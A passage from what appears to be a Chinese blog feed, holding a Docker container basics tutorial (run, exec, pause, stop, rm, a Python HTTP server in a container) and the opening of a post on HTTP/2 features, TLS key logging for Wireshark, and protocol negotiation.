type="1"><li>启动ubuntu容器</li></ol><p>当容器创建好之后，我们就可以通过dockerstart命令来启动容器，容器启动成功后通过dockerps命令可以查看到容器状态的变化。在这里我们要注意：同一个镜像创建的多个容器之间是不相关的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wpq431lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wpq431lmrh9u69"><pre><code class="hljs shell">docker start ubuntu-1docker ps -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115032403100_490_image-20230904222232252.png" alt="image-20230904222232252"><figcaption aria-hidden="true">image-20230904222232252</figcaption></figure><h3 id="容器的快速启动方式">容器的快速启动方式</h3><p>在上一个小节中我们介绍了docker容器创建的标准流程。而在实际操作过程中，使用标准步骤创建启动容器会比较繁琐，因此docker提供了更加简便的命令dockerrun。使用该命令时，docker会自动完成下载镜像，创建容器，启动容器的工作。</p><ol type="1"><li>创建容器指定名称的容器</li></ol><p>通过以下的一条命令，我们就可以完成下载busybox的容器镜像，创建名为busybox-1的容器，为了让容器可以在创建之后长期运行我们要使用-it参数，为了让容器在启动之后在后台运行，我们需要使用-d参数。在容器启动之后我们使用dockerps命令查询正在运行的容器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bxbi6flmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bxbi6flmrh9u69"><pre><code class="hljs shell">docker run -itd --name ubuntu-2 ubuntudocker ps -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115035769165_650_image-20230904222752630.png" alt="image-20230904222752630"><figcaption aria-hidden="true">image-20230904222752630</figcaption></figure><ol start="2" type="1"><li>操作已经创建的容器</li></ol><p>使用-d参数创建容器之后，容器在后台运行，前台的命令行仍然指向宿主机。为了能狗通过命令行操作容器，我们可以使用dockerexec命令在ubuntu-2容器上启动bash控制台程序，从而对容器进行操作。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ahvfjglmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ahvfjglmrh9u69"><pre><code class="hljs shell">docker exec -it ubuntu-2 bin/bash</code></pre></div></div><p>​命令执行之后提示行提示符发生了改变。这说明当前用户所操作的已经是容器中的操作系统。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115038972707_654_image-20230904222911314.png" alt="image-20230904222911314"><figcaption aria-hidden="true">image-20230904222911314</figcaption></figure><ol start="3" type="1"><li>创建一次性容器</li></ol><p>上面我们为大家介绍的常见的容器创建方法，如果用户在使用dockerrun创建容器的时候，如果不使用-d参数。则启动容器成功之后，会自动进入容器操作系统控制台。但是此种方法进入容器操作系统之后，如果使用exit退出，容器会被关闭。因此此种方法只适用通过容器中执行一些临时性的操作时使用。</p><p>接下来我们创建一次性容器，并且在一次性容器退出之后使用docker ps-a查看容器，当我们使用dockerps时，只会列出正在运行的容器，而使用了-a参数之后，会列出包括了正在运行的和已经退出了的各种状态的容器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-29dwrxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-29dwrxlmrh9u69"><pre><code class="hljs shell">docker run -it --name temp ubuntuexit</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-66rw4nlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-66rw4nlmrh9u69"><pre><code class="hljs shell">docker ps -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115043608109_578_image-20230904223136488.png" alt="image-20230904223136488"><figcaption aria-hidden="true">image-20230904223136488</figcaption></figure><h3 id="为容器安装命令行工具">为容器安装命令行工具</h3><ol type="1"><li>启动容器并测试常用命令</li></ol><p>首先用docker run创建一个新的ubuntu容器并启动</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cm76e8lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-cm76e8lmrh9u69"><pre><code class="hljs shell">docker run -it --name ubuntu-3 ubuntu</code></pre></div></div><p>接下来再通过<code>lsb_release</code>查看操作系统的状态。会显示命令无法找到，原因是通过容器安装的ubuntu属于极简版本，没有安装非必要的命令。为了能在容器虚拟机中执行常用的操作</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tfr97elmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tfr97elmrh9u69"><pre><code class="hljs shell">lsb_release</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115049222439_512_image-20230904223327185.png" alt="image-20230904223327185"><figcaption aria-hidden="true">image-20230904223327185</figcaption></figure><ol type="1"><li>在容器中安装命令</li></ol><p>对于ubuntu镜像的容器，我们可以使用apt-get命令来安装常用命令。接下来我们使用apt-getinstall来安装lsb_release，ifconfig，vim三个工具。需要注意的在使用apt-getinstall之前，需要首先使用apt-getudpate来更新本地资源库。另外就是此步骤受网络速度影响可能会有比大的延迟。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a6ckuqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-a6ckuqlmrh9u69"><pre><code class="hljs shell">apt-get updateapt-get install -y lsb-core net-tools vim --fix-missing</code></pre></div></div><p>在容器中体验安装命令后，使用exit退出容器继续下面操作。</p><ol type="1"><li>busybox镜像的使用</li></ol><p>在docker中，传统的ubuntu或者centos镜像所包含的命令数量都非常少，每次使用时都需要手动安装相关命令非常不方便，因此在实际使用docker时，我们经常使用busybox镜像来作为基础镜像。</p><p>接下来我们尝试创建busybox镜像，要注意的时，为了保证镜像体积，busybox镜像中并不包括bash命令，而是使用了替代的sh命令。因此我们创建busybox镜像的命令也需要做调整。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sznjlulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-sznjlulmrh9u69"><pre><code class="hljs shell">docker run -itd --name busybox-1 busyboxdocker exec -it busybox-1 sh</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115052365509_199_image-20230904223513737.png" alt="image-20230904223513737"><figcaption aria-hidden="true">image-20230904223513737</figcaption></figure><p>容器创建成功之后，我们尝试ifconfig和vi命令发现已经内置在容器之中，不过需要注意的时busybox镜像并没有包含apt-get或者yum等自动包安装工具。因此和ubuntu或者centos镜像相比，安装新工具会比较繁琐。</p><p>注意使用vi编辑器时：</p><ol type="1"><li>需要先按i键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按大写的ZZ保存并退出vi。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pxlai7lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pxlai7lmrh9u69"><pre><code class="hljs shell">ifconfigvi a.txt</code></pre></div></div><p>体验完busybox镜像的使用后，我们执行exit退出继续下面操作。</p><h3 id="查看容器系统信息">查看容器系统信息</h3><p>上一小节我们带大家学习了如何启动一个容器，当容器启动之后会作为轻量级的虚拟机在本地进行运行。本小节我们将学习如何在控制台操作作为虚拟机的容器。</p><ol type="1"><li>查看宿主机信息</li></ol><p>为了对比容器和宿主机，我们先用lsb_release -a命令查看宿主操作系统</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k4khinlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-k4khinlmrh9u69"><pre><code class="hljs shell">lsb_release -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115057562682_162_image-20230904223838981.png" alt="image-20230904223838981"><figcaption aria-hidden="true">image-20230904223838981</figcaption></figure><p>接下来我们再用ifconfig命令查看宿主机网络信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-72fkbclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-72fkbclmrh9u69"><pre><code class="hljs shell">ifconfig</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115101741869_245_image-20230904225731155.png" alt="image-20230904225731155"><figcaption aria-hidden="true">image-20230904225731155</figcaption></figure><ol type="1"><li>查看容器信息</li></ol><p>当上述命令(在<code>ubuntu-3</code>中)安装好之后，我们就可以查看容器操作系统的状态和网络状态了。查询后发现和宿主机的信息已经不同。说明我们的控制台已经在容器操作系统中了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lxgestlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lxgestlmrh9u69"><pre><code class="hljs shell">docker start ubuntu-3docker exec -it ubuntu-2 bin/bash</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hdadrklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-hdadrklmrh9u69"><pre><code class="hljs shell">lsb_release -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115105385086_458_image-20230904225509265.png" alt="image-20230904225509265"><figcaption aria-hidden="true">image-20230904225509265</figcaption></figure><p>我们接下来在查看容器的IP地址，（注意和宿主机网络信息的对比）</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k32eevlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-k32eevlmrh9u69"><pre><code class="hljs shell">ifconfig</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115109519062_970_image-20230904225756902.png" alt="image-20230904225756902"><figcaption aria-hidden="true">image-20230904225756902</figcaption></figure><p>可以感受到容器对环境的隔离效果。</p><h2 id="容器管理命令">容器管理命令</h2><h3 id="构建实验环境">构建实验环境</h3><p>在前面的实验中，我们介绍了容器的启动和操作。在本实验中，我们继续介绍Docker中针对容器的操作命令。首先我们会在容器中用python启动一个简单的http服务，以便为后续的实验做准备。</p><ol type="1"><li>创建容器</li></ol><p>首先我们来创建一个新的ubuntu容器。在创建成功后使用dockerexec进入容器控制台。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7cq8b8lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7cq8b8lmrh9u69"><pre><code class="hljs shell">docker run -itd --name ubuntu-3 ubuntudocker exec -it ubuntu-3 /bin/bash</code></pre></div></div><ol start="2" type="1"><li>安装工具</li></ol><p>为了演示后面的实验，我们在容器中安装python3，ifconfig，curl三个命令行工具。其中ifconfig命令工具需要安装net-tools工具包。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ives5slmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ives5slmrh9u69"><pre><code class="hljs shell">apt-get updateapt-get install -y python3 net-tools curl</code></pre></div></div><ol start="3" type="1"><li>运行服务</li></ol><p>接下来我们启动一个默认的python3http服务，服务启动在8000端口，并使用<code>nohup</code>命令将服务设置为在后台运行(nohup:ignoringinput and appending output to'nphup.out'按回车)。在服务启动之后，我们在容器中使用curl测试一下服务的运行状态。会看到http服务返回了网页。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m1tosjlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-m1tosjlmrh9u69"><pre><code class="hljs shell">nohup python3 -m http.server 8000 &amp;curl 127.0.0.1:8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115112783989_685_image-20230905102403283.png" alt="image-20230905102403283"><figcaption aria-hidden="true">image-20230905102403283</figcaption></figure><h3 id="访问容器中的应用">访问容器中的应用</h3><p>在上一个小节中，我们通过docker启动了一个容器，同时在这个容器中启动了一个http服务。本小节中我们来学习如何访问这个容器中的服务。以及如何查看容器中服务的进程状态查询命令。</p><ol type="1"><li>查看容器的网络地址</li></ol><p>在容器内部测试http服务成功后，接下来我们需要在宿主机中测试http服务。当容器创建之后，会自动创建属于容器自己的网卡和网络地址，并且保证容器的网卡可以和宿主机互相访问，因此我们先通过<code>ifconfig</code>命令来显示并记录<code>容器的ip地址</code>。然后退出容器的控制台。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115117023864_642_image-20230905102632272.png" alt="image-20230905102632272"><figcaption aria-hidden="true">image-20230905102632272</figcaption></figure><ol start="2" type="1"><li>测试访问容器服务</li></ol><p>在宿主机控制台中，我们同样使用<code>curl</code>命令来访问容器中的http服务，需要注意的是：在宿主机中我们需要通过上一步<code>容器IP地址</code>才能访问到容器中的服务。通过测试我们发现在宿主机中通过IP访问容器服务活得内容和在容器中获得的内容一致。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-slyfvplmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-slyfvplmrh9u69"><pre><code class="hljs shell">curl [容器IP]:8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115120768011_197_image-20230905102847301.png" alt="image-20230905102847301"><figcaption aria-hidden="true">image-20230905102847301</figcaption></figure><p>在上一个步骤中我们通过宿主机访问了容器内的服务。除此之外我们还可以在宿主机中通过dockertop命令来查看容器中正在运行的具体进程。其命令的语法为docker top容器名。我们输入如下命令，可以看到ubuntu-3容器运行着2个进程，分别是bash控制台进程和python3http服务器进程。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sesnkmlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-sesnkmlmrh9u69"><pre><code class="hljs shell">docker top ubuntu-3</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115127139220_531_image-20230905103123487.png" alt="image-20230905103123487"><figcaption aria-hidden="true">image-20230905103123487</figcaption></figure><h3 id="容器的暂停和恢复">容器的暂停和恢复</h3><p>对于已经启动的容器。我们可以使用dockerpause/unpause命令对容器进行暂停/恢复。当容器被暂停之后，容器内的服务将会暂停，当容器恢复之后服务恢复。在上一小节中我们在容器中用python启动了一个简单的http服务，这一小节我们来测试容器的暂停和恢复对http服务的影响。</p><ol type="1"><li>通过<code>docker pause</code>命令暂停容器运行，容器暂停后通过<code>docker top</code>命令来查看容器中进程。发现进程依然存在，再通过<code>curl</code>测试http服务，发现已经无响应，证明服务已经停止。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-d6isp0lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-d6isp0lmrh9u69"><pre><code class="hljs shell">docker pause ubuntu-3docker ps -acurL[容器IP]:8000 Ctrl+C</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115130478163_735_image-20230905103701392.png" alt="image-20230905103701392"><figcaption aria-hidden="true">image-20230905103701392</figcaption></figure><ol start="2" type="1"><li>通过<code>docker unpause</code>命令恢复容器运行，测试http服务，发现已经恢复访问。</li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115135872273_522_image-20230905103928331.png" alt="image-20230905103928331"><figcaption aria-hidden="true">image-20230905103928331</figcaption></figure><h3 id="容器的停止重启和删除">容器的停止，重启和删除</h3><p>上一小节我们学习的容器的暂停和恢复。除了暂停/恢复之外，我们还可以对容器进行启动和停止操作。和暂停恢复不同的是，容器重启之后，容器内部运行的应用会被停止。比较类似于物理机的重新启动。</p><ol type="1"><li>容器的停止</li></ol><p>首先我们利用<code>docker top</code>命令显示容器中正在运行的应用。接下来我们使用<code>docker stop</code>命令停止容器，停止之后用<code>docker ps -a</code>命令查看容器状态，会发现容器变成了<code>Exited</code>状态</p><p>看容器状态，会发现容器变成了Exited状态</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mcvq4ilmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mcvq4ilmrh9u69"><pre><code class="hljs shell">docker top ubuntu-3docker stop ubuntu-3docker ps -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115141294293_905_image-20230905104252646.png" alt="image-20230905104252646"><figcaption aria-hidden="true">image-20230905104252646</figcaption></figure><ol start="2" type="1"><li>容器的重启</li></ol><p>对于已经进入<code>Exited</code>状态的容器，我们可以利用<code>docker restart</code>命令重新启动容器，当容器重新启动之后，我们再利用<code>docker top</code>和<code>curl</code>测试容器中的http服务，已经不可使用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bthuh6lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bthuh6lmrh9u69"><pre><code class="hljs shell">docker restart ubuntu-3docker top ubuntu-3</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-691u56lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-691u56lmrh9u69"><pre><code class="hljs shell">curl [容器IP]:8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115145758825_431_image-20230905104419168.png" alt="image-20230905104419168"><figcaption aria-hidden="true">image-20230905104419168</figcaption></figure><ol start="3" type="1"><li>容器的删除</li></ol><p>对于已经不再需要的容器，我们可以使用<code>docker rm</code>命令进行删除，<code>docker rm</code>命令可以使用<code>CONTAINER ID</code>或者<code>NAME</code>作为参数。在默认情况下，我们只能删除<code>Exited状</code>态下的容器，如果容器的状态不是停止。则需要为<code>docker rm</code>添加<code>--force</code>或者<code>-f</code>参数才可以删除。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xvtir2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-xvtir2lmrh9u69"><pre><code class="hljs shell">docker ps -adocker rm --force [CONTAINER ID]docker ps -a</code></pre></div></div><p>或</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1q168klmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-1q168klmrh9u69"><pre><code class="hljs shell">docker rm --force ubuntu-3docker ps -a</code></pre></div></div><p>我们会发现容器已经被删除了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906115148957414_272_image-20230905104646099.png" alt="image-20230905104646099"><figcaption aria-hidden="true">image-20230905104646099</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2djn89lmrh9u69"></i><span>stylus</span><div class="collapse show" id="collapse-2djn89lmrh9u69"><pre><code class="hljs stylus">rm-bp1n5f8yed463o5d0<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.rds</span><span class="hljs-selector-class">.aliyuncs</span>.com</code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重新认识HTTP/2</title>
    <link href="/posts/46608/"/>
    <url>/posts/46608/</url>
    
    <content type="html"><![CDATA[<h1 id="重新认识http2">重新认识HTTP/2</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="http://localhost:4000/posts/46285/">上一节</a>从HTTP的起源开始，重点深入探讨了HTTP/1.1新增特性的一些细节。本节将继续深入剖析HTTP/2的重要特性，并结合实践进行分析。</p><h2 id="总览">总览</h2><p>HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是 5 到 8个），但是带来的成本和复杂性堪忧。比如，HTTP管线化（pipelining）就成为了 Web开发的负担。如下图的形式，浏览器同时建立了5个TCP连接，这样确实可以“并行”的获取资源，避免了前面提到的队头阻塞问题，但每一次TCP都要三次握手四次挥手，而且内存要同时为5个链接开辟缓冲区，未免有些太浪费计算和存储资源。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142651995802_532_image-20230828223930304.png" alt="image-20230828223930304" width="67%" height="67%"></p><p>为此，在 2010 年早期，谷歌通过实践了一个实验性的 SPDY协议。SPDY并不是字母缩略词，而仅仅是"speedy"的缩写。它是对HTTP协议的增强，包括数据流的多路复用、请求优先级以及HTTP报头压缩等。事实上这就是HTTP/2所主要新增的内容。不过一开始，SPDY并不用于取代HTTP，它只是修改了HTTP的请求与应答在网络上传输的方式；这意味着只需增加一个SPDY传输层，现有的所有服务端应用均不用做任何修改。后来，SPDY的成果被采纳而最终演变为HTTP/2。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829213505935335_240_image-20230829212355918.png" alt="image-20230829212355918" width="50%" height="50%"></p><p>HTTP/2 在 HTTP/1.1 有几处基本的不同：</p><ul><li>HTTP/2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建。</li><li>这是一个多路复用协议。并行的请求能在同一个链接中处理，移除了HTTP/1.x 中顺序和阻塞的约束。</li><li>压缩了标头。因为标头在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li><li>其允许服务器在客户端缓存中填充数据，通过服务器推送的机制来提前请求。</li></ul><p>如果希望详尽的了解HTTP/2的细节，可以参见第一手资料<a href="https://www.rfc-editor.org/rfc/rfc7540#page-4">RFC7540</a>。同时有<a href="https://www.rfc-editor.org/rfc/rfc7541#page-4">RFC7541</a>。它主要单独讨论了HTTP/2 的头部压缩 (HPACK) 问题。</p><h2 id="实践基础">实践基础</h2><p>首先，现在的HTTP/2连接几乎都是 HTTP over TLS (即 HTTPS)的。关于HTTPS，后面会详细介绍。这意味着，我们无法像HTTP/1.x版本一样如果不是HTTPS就可以用wireshark抓到明文包的。</p><p>但是，我们也不是没有办法。毕竟我们从浏览器的F12中就能看到HTTP/2的一些信息。浏览器知道怎么解密这些信息。是的，否则我们也无法看到想看到的页面。</p><p>具体来说，Chrome 或者 Firefox 都支持: 如果设置了环境变量<code>SSLKEYLOGFILE</code>, 就把 SSL/TLS的<code>pre-master  secret key</code>写到设置的文件里面去.之后可以使用这个<code>pre-master secret key</code> 文件在 wireshark里面解密加密的流量。</p><p>由于我使用的是mac，这里以mac为例讲解配置方法，Windows和linux同理。</p><p>1.设置 <code>SSLKEYLOGFILE</code> 环境变量 可以简单在命令行使用export 命令 (记得之后打开 Chrome 要在这个命令行)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vmqermlmrh9u6a"></i><span>shell</span><div class="collapse show" id="collapse-vmqermlmrh9u6a"><pre><code class="hljs shell">export SSLKEYLOGFILE=~/ssh_key.log</code></pre></div></div><p>2.在同一个命令行窗口打开 Chrome</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ueo3hwlmrh9u6a"></i><span>shell</span><div class="collapse show" id="collapse-ueo3hwlmrh9u6a"><pre><code class="hljs shell">open /Applications/Google\ Chrome.app/</code></pre></div></div><p>3.在 Chrome 随便访问一个 https 的网站, 检查<code>~/ssh_key.log</code>是不是有内容</p><p>4.打开 wireshark 拦截流量或者 使用 tcpdump 有针对性的拦截</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xdo732lmrh9u6a"></i><span>shell</span><div class="collapse show" id="collapse-xdo732lmrh9u6a"><pre><code class="hljs shell">sudo tcpdump host 103.144.218.5 -w mydump.pcap</code></pre></div></div><p>5.打开 wireshark, 分析这个加密的流量. 显示设置SSL/TLS 的<code>pre-master secret key log</code> 文件:</p><p>菜单: preferences -&gt; Protocols -&gt; TLS</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142653033344_250_image-20230828224802757.png" alt="image-20230828224802757"><figcaption aria-hidden="true">image-20230828224802757</figcaption></figure><p>以我自己的电脑为例，在终端输入<code>ifconfig</code>，查看wifi对应网卡的ip地址，如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829213511943925_465_image-20230829212654935.png" alt="image-20230829212654935"><figcaption aria-hidden="true">image-20230829212654935</figcaption></figure><p>可以看到ip地址为<code>10.136.68.170</code>。后文中用“客户端”指代。</p><h2 id="http2协商">HTTP2协商</h2><p>由于 HTTP不同版本协议之间的交互方式存在差异, 当客户端和服务端通信时,首先需要确定或称协商出所使用的 HTTP 协议版本,对于存在多版本的协议的通信双方在握手时几乎都需要有协商 (Negotiation)环节。</p><p>单纯的 HTTP 协议和 HTTP over TLS (即 https) 协议对于 HTTP/2的协商方式是不同的。在协议中以 h2 表示 HTTP over TLS, 以 h2c (c 是 clear的首字母, 代表 clear text, 与 https 的加密报文相区分) 表示单纯的 HTTP协议。二者的协商方式不同, 我们首先讨论 HTTP 的协商方式。</p><h3 id="http协商">HTTP协商</h3><p>在这种情况下，HTTP/2的协商方式和HTTP/1/1的协商方式是相同的。由于之前没有讲述HTTP/1.1的协商方式，在这里再进行讲解。</p><p>在没有任何先验知识的情况下, 客户端若想要和服务端以 HTTP/2协议进行通信, 那么客户端可以向服务端发送如下形式的 Request:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iuvv33lmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-iuvv33lmrh9u6a"><pre><code class="hljs http"><span 